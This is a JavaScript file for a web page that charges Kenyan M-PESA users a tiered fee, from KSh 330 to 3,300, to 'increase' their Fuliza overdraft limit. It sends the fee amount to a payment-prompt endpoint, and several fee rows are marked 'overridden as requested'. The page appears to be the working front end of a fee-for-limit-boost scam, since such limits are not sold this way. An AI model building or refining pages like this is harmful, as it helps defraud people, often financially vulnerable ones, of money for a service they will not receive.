const plans = [
  { amount: 5000,  fee: 330  },
  { amount: 10000, fee: 550  },
  { amount: 15000, fee: 630  },  // overridden as requested
  { amount: 20000, fee: 730  },  // overridden as requested
  { amount: 25000, fee: 880  },  // overridden as requested
  { amount: 30000, fee: 990  },  // overridden as requested
  { amount: 35000, fee: 1050 },  // overridden as requested
  { amount: 40000, fee: 1230 },
  { amount: 45000, fee: 1330 },
  { amount: 50000, fee: 1470 },
  { amount: 55000, fee: 1610 },
  { amount: 60000, fee: 1765 },
  { amount: 65000, fee: 1895 },
  { amount: 70000, fee: 2120 },
  { amount: 70001, fee: 3300, label: 'Above KSh 70,000' }  // special "Above" tier
];
let selected = plans[2]; // default to 15,000

const plansEl = document.querySelector('#plans');
const phone = document.querySelector('#phone');
const error = document.querySelector('#error');
const btn = document.querySelector('#requestBtn');
const amountEl = document.querySelector('#selectedAmount');
const feeEl = document.querySelector('#fee');
const statusCard = document.querySelector('#statusCard');
const money = n => 'KSh ' + n.toLocaleString('en-KE');

function render() {
  plansEl.innerHTML = plans.map((p, i) => {
    const isAbove = p.amount === 70001;
    const displayAmount = isAbove ? (p.label || 'Above KSh 70,000') : money(p.amount);
    const active = i === 2 ? 'active' : '';
    return `
      <button class="plan ${active}" data-i="${i}" type="button" aria-pressed="${i === 2}">
        <span class="amount">${displayAmount}</span>
        <span class="fee">${money(p.fee)}</span>
      </button>
    `;
  }).join('');

  document.querySelectorAll('.plan').forEach(el => {
    el.onclick = () => {
      document.querySelectorAll('.plan').forEach(x => {
        x.classList.remove('active');
        x.setAttribute('aria-pressed', 'false');
      });
      el.classList.add('active');
      el.setAttribute('aria-pressed', 'true');
      selected = plans[+el.dataset.i];
      const isAbove = selected.amount === 70001;
      amountEl.textContent = isAbove ? (selected.label || 'Above KSh 70,000') : money(selected.amount);
      feeEl.textContent = money(selected.fee);
    };
  });
}

render();

// set initial summary
amountEl.textContent = money(selected.amount);
feeEl.textContent = money(selected.fee);

phone.addEventListener('input', () => {
  phone.value = phone.value.replace(/\D/g, '').slice(0, 10);
  error.textContent = '';
});

function normalize() {
  let n = phone.value;
  if (n.startsWith('0')) n = n.slice(1);
  if (n.length !== 9 || !/^7\d{8}$/.test(n)) return null;
  return '254' + n;
}

btn.onclick = async () => {
  const msisdn = normalize();
  if (!msisdn) {
    error.textContent = 'Enter a valid Kenyan M-PESA number, for example 0712 345 678.';
    phone.focus();
    return;
  }
  btn.disabled = true;
  btn.querySelector('span').textContent = 'Preparing payment prompt…';
  try {
    const res = await fetch('/api/payment/prompt', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        msisdn,
        amount: selected.fee,
        increase: selected.amount === 70001 ? 70000 : selected.amount  // send 70000 for "Above"
      })
    });
    const data = await res.json();
    if (!res.ok) throw new Error(data.message || 'Unable to start payment.');
    statusCard.classList.remove('hidden');
    document.querySelector('#statusTitle').textContent = data.demo ? 'Payment prompt demo' : 'Payment prompt sent';
    document.querySelector('#statusText').textContent = data.message;
    statusCard.scrollIntoView({ behavior: 'smooth', block: 'center' });
  } catch (e) {
    error.textContent = e.message;
  } finally {
    btn.disabled = false;
    btn.querySelector('span').textContent = 'Request Fuliza Increase';
  }
};
